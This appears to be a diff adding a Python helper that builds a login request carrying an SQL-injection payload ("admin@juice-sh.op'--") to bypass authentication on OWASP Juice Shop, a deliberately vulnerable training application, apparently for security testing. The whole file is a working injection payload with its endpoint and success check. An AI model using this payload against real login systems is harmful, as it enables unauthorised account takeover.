@@ -1,0 +1,26 @@
+```python
+def trigger_sqli_login_bypass(target_url: str, email_payload: str = "admin@juice-sh.op'--") -> dict:
+    """Proof-of-Trigger Function for OWASP Juice Shop SQLi auth bypass.
+
+    Variable inputs:
+        target_url    : full base URL of the juice-shop instance
+                        (e.g. "http://localhost:3001")
+        email_payload : the SQL-injection payload placed in the email
+                        field. Default crafted to comment out the
+                        password check on Juice Shop's login query.
+
+    Invariants (extracted from references):
+        * endpoint    : POST {target_url}/rest/user/login
+        * content type: application/json
+        * body shape  : {"email": <payload>, "password": <any>}
+        * success     : HTTP 200 with response.authentication.token (JWT)
+    """
+    import json
+
+    return {
+        "method": "POST",
+        "url": f"{target_url.rstrip('/')}/rest/user/login",
+        "headers": {"Content-Type": "application/json"},
+        "body": json.dumps({"email": email_payload, "password": "anything"}),
+    }
+```
